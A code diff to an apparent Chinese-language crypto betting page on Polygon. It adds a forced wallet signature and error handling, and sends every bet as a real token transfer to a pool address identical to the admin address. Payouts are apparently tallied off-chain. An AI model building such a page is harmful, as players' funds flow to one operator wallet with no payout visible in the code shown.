@@ -167,11 +167,11 @@ body{background:#0F172A;color:#fff;padding:16px;min-height:100vh}
 </div>
 
 <script>
-// ==================== 已填好你的地址 ====================
+// ==================== 你的地址已填好 ====================
 const TOKEN_ADDR    = "0xc2132D05D31c914a87C6611C10748AEb04B58e8F";
 const POOL_ADDR     = "0x1796F1effb34e88d5A87a07E0C30E509bF14d6b9";
 const DECIMALS      = 18;
-const CHAIN_ID      = "0x89";
+const CHAIN_ID      = "0x89"; // Polygon
 const ADMIN_ADDR    = "0x1796F1effb34e88d5A87a07E0C30E509bF14d6b9";
 // ======================================================
 
@@ -303,29 +303,32 @@ function doOpenRound(){
   },3000);
 }
 
-// ==================== 真实转账下注 → 庄家地址 ====================
+// ==================== 真实上链转账下注 ====================
 async function doBet(side){
-  if(!userAddr)return alert("请连接钱包");
-  if(betAmount<=0)return alert("输入下注金额");
+  if(!userAddr)return alert("请先连接钱包");
+  if(betAmount<=0)return alert("请输入下注金额");
   if(roundTime<=5)return alert("已封盘，下次再下注");
 
   try {
     const amountWei = ethers.parseUnits(betAmount.toString(), DECIMALS);
-    // 转账到庄家/底池地址
+    // 真实转账到庄家/底池地址
     const tx = await token.transfer(POOL_ADDR, amountWei);
-    await tx.wait();
+    document.getElementById('status').innerText = "⏳ 交易确认中...";
+    await tx.wait(); // 等待上链确认
 
-    // 记录下注方向，供机器人统计赔付
+    // 记录下注方向
     if(side===0)totalDragon+=betAmount;
     if(side===1)totalTiger+=betAmount;
     if(side===2)totalTie+=betAmount;
 
     document.getElementById('status').innerText = "✅ 下注成功，等待开奖";
+    refreshBalance(); // 刷新余额
     setTimeout(()=>{
       document.getElementById('status').innerText=i18n[lang].wait;
     },2000);
   }catch(e){
     alert("下注失败："+e.message);
+    document.getElementById('status').innerText=i18n[lang].wait;
   }
 }
 
@@ -350,29 +353,60 @@ document.querySelectorAll('.tab-btn').forEach(b=>{
   }
 });
 
-// ==================== 连接钱包 ====================
-document.getElementById('connectBtn').onclick=async()=>{
-  if(!window.ethereum)return alert("请在钱包打开");
-  await window.ethereum.request({method:"wallet_switchEthereumChain",params:[{chainId:CHAIN_ID}]});
-  provider=new ethers.BrowserProvider(window.ethereum);
-  await provider.send("eth_requestAccounts",[]);
-  signer=await provider.getSigner();
-  userAddr=await signer.getAddress();
-  document.getElementById('address').innerText=userAddr;
-  document.getElementById('connectBtn').innerText=i18n[lang].connected;
+// ==================== 修复：连接钱包 + 强制签名授权 ====================
+document.getElementById('connectBtn').onclick = async () => {
+  if(!window.ethereum)return alert("请安装MetaMask或在钱包浏览器打开");
+  try {
+    // 1. 切换到Polygon链
+    await window.ethereum.request({
+      method:"wallet_switchEthereumChain",
+      params:[{chainId:CHAIN_ID}]
+    });
 
-  const ERC20_ABI=[
-    "function balanceOf(address)view returns(uint256)",
-    "function transfer(address to,uint256 amount)returns(bool)"
-  ];
-  token=new ethers.Contract(TOKEN_ADDR,ERC20_ABI,signer);
-  refreshBalance();
+    // 2. 初始化Provider
+    provider = new ethers.BrowserProvider(window.ethereum);
+
+    // 3. 请求账户授权（弹钱包）
+    await provider.send("eth_requestAccounts", []);
+
+    // 4. 获取Signer
+    signer = await provider.getSigner();
+    userAddr = await signer.getAddress();
+
+    // 5. 强制签名验证（必弹签名）
+    const signMsg = `Sign to verify ownership\nAddress: ${userAddr}\nTime: ${Date.now()}`;
+    const signature = await signer.signMessage(signMsg);
+    console.log("签名成功:", signature);
+
+    // 6. 初始化代币合约
+    const ERC20_ABI = [
+      "function balanceOf(address) view returns (uint256)",
+      "function transfer(address to, uint256 amount) returns (bool)"
+    ];
+    token = new ethers.Contract(TOKEN_ADDR, ERC20_ABI, signer);
+
+    // 7. 显示信息
+    document.getElementById('address').innerText = userAddr;
+    document.getElementById('connectBtn').innerText = i18n[lang].connected;
+    refreshBalance(); // 读取余额
+    alert("钱包连接+签名验证成功");
+
+  } catch(e) {
+    alert("连接失败："+e.message);
+    console.error(e);
+  }
 };
 
+// ==================== 读取代币余额 ====================
 async function refreshBalance(){
-  if(!userAddr)return;
-  const b=await token.balanceOf(userAddr);
-  document.getElementById('balance').innerText=Number(ethers.formatUnits(b,DECIMALS)).toFixed(2);
+  if(!userAddr || !token)return;
+  try {
+    const balWei = await token.balanceOf(userAddr);
+    const bal = ethers.formatUnits(balWei, DECIMALS);
+    document.getElementById('balance').innerText = parseFloat(bal).toFixed(2);
+  } catch(e) {
+    console.error("读取余额失败", e);
+  }
 }
 
 // ==================== 快捷下注 ====================
